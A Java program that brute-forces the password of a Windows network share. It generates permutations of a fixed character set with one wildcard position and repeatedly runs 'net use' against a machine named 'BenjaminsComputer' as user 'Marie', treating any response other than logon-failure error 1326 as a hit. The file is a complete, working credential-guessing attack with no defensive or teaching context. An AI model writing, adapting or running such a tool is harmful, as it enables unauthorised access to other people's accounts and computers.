import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.Date;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.Calendar;

public class Main
{
    private static final int MAX_LIST_LENGTH = 5, THREADS_NUMBER = 1;
    private static final String CHARS = "Mab²c9e<";
    /*
     * !"~$%&'()*+,-./:;<=>?@[\]^_`{|}~
     * ABCDEFGHIJKLMNOPQRSTUVWXYZ
     * abcdefghijklmnopqrstuvwxyz
     * 0123456789
     * abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\"~$%&'()*+,-./:;<=>?@[\\]^_`{|}~
     */
    private static ArrayList<String> urls = new ArrayList<String>();
    private static final String ALL_CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\\\"~$%&'()*+,-./:;<=>?@[\\\\]^_`{|}~";

    public static void permutation(String str)
    {
        permutation("", str);
    }

    private static void permutation(String prefix, String str)
    {
        int n = str.length();
        if(n == 0)
            urls.add(prefix);
        else
        {
            for(int i = 0; i < n; i++)
                permutation(prefix + str.charAt(i), str.substring(0, i) + str.substring(i + 1, n));
        }
    }

    private static void recursiveSearch(String urlStr, int index, int listLength)
    {
        if(index > listLength)
        {
            urls.add(urlStr);
        }
        else
        {
            for(int charIndex = 0; charIndex < CHARS.length(); charIndex++)
                recursiveSearch(urlStr + CHARS.charAt(charIndex), index + 1, listLength);
        }
    }

    static long lastUrlsSize = 0;

    private static double globalSpeed()
    {
        return 1000 * (double)(urlsInitSize - urls.size()) / (double)(Calendar.getInstance().getTimeInMillis() - newTime);
    }

    private static int estimate()
    {
        return (int)(Math.pow(CHARS.length() + 1, MAX_LIST_LENGTH)); // counts things like: " a " (which are normaly impossible)
    }

    private static double estimateEnd()
    {
        return 1000.0 * urls.size() / globalSpeed();
    }

    private static String estimeEndDate()
    {
        return new Date((long)(Calendar.getInstance().getTimeInMillis() + estimateEnd())).toLocaleString();
    }

    private static String withSpaces(double l)
    {
        DecimalFormat formatter = new DecimalFormat("#,###");
        return formatter.format(l);
    }

    private static void forFunction()
    {
        long time = Calendar.getInstance().getTimeInMillis();
        /// System.out.println("Start enumerating something like: " + estimate() + " ...");
        urlsInitSize = urls.size();
        lastUrlsSize = urlsInitSize;
        newTime = Calendar.getInstance().getTimeInMillis();
        /// System.out.println("Ended in: " + (newTime - time) + " ms !");

        for(int threadIndex = 0; threadIndex < THREADS_NUMBER; threadIndex++)
        {
            Thread th = new Thread()
            {
                public void run()
                {

                    while(true)
                    {
                        try
                        {
                            String urlStr = urls.remove(0);

                            int index = urlStr.indexOf("²");
                            // System.out.println(urlStr);
                            for(char chr : ALL_CHARS.toCharArray())
                            {
                                urlStr = urlStr.substring(0, index) + chr + urlStr.substring(index + 1);
                                // System.out.println(urlStr);

                                ProcessBuilder pb = new ProcessBuilder("net", "use", "\\\\BenjaminsComputer", "/User:Marie", urlStr);
                                pb.redirectErrorStream(true);
                                BufferedReader inStreamReader = new BufferedReader(new InputStreamReader(pb.start().getInputStream()));
                                String line = "";
                                line = inStreamReader.readLine();
                                if(!line.contains("System error 1326 has occurred."))
                                {
                                    System.out.println(urlStr + " " + line + " done in: " + (Calendar.getInstance().getTimeInMillis() - newTime) + " ms !");
                                    System.exit(0);
                                }
                                else
                                {
                                    // System.out.println(line);
                                }
                            }
                        }
                        catch(Exception e)
                        {}
                    }
                }
            };
            th.start();
        }

        while(true)
        {
            if(urls.isEmpty())
            {
                System.out.println("OUT !");
                return;
                // System.exit(0);
            }
            if(true)
            {
                System.out.println(withSpaces(Calendar.getInstance().getTimeInMillis() - newTime) + " " + withSpaces(urls.size()) + " / " + withSpaces(urlsInitSize));
                System.out.println("Global speed: " + withSpaces(globalSpeed()) + " tests/s");
                System.out.println("Estimated end: " + estimeEndDate());
                System.out.println("Just done in a second: " + (lastUrlsSize - urls.size()) + "\n");
            }
            lastUrlsSize = urls.size();
            try
            {
                Thread.sleep(1000);
            }
            catch(InterruptedException e)
            {
                e.printStackTrace();
            }

        }
    }

    static long newTime = 0, urlsInitSize = 0;

    public static void main(String[] args)
    {
        permutation(CHARS);
        // recursiveSearch("", 0, MAX_LIST_LENGTH - 1);
        forFunction();
    }
}